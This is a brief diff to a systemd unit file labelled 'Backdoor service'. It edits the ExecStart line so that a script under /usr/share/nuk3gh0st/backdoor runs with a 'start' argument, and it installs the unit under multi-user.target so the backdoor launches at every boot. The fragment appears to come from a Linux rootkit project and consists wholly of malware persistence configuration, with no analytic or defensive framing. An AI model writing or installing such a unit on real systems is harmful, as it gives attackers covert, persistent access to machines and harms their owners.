@@ -2,7 +2,7 @@
 Description=Backdoor service
 
 [Service]
-ExecStart=/bin/bash /usr/share/nuk3gh0st/backdoor
+ExecStart=/bin/bash /usr/share/nuk3gh0st/backdoor start
 
 [Install]
 WantedBy=multi-user.target
